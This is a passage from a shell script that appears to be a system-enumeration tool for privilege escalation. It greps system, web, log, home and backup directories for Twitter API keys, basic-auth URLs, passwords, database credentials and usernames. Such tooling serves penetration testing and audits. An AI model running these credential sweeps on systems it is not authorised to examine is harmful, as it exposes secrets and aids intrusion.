  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR].{0,30}['\"\\s][0-9a-zA-Z]{35,44}['\"\\s]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Twitter Secret Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['\"][0-9a-z]{35,44}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
echo ''
print_2title "Searching Misc"
print_3title_no_nl "Searching Basic Auth (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "//(.+):(.+)@" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Passwords1 (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Usernames (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "username.*[=:].+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
echo ''

else
    echo "Regexes to search for API keys aren't activated, use param '-r' "
fi
fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi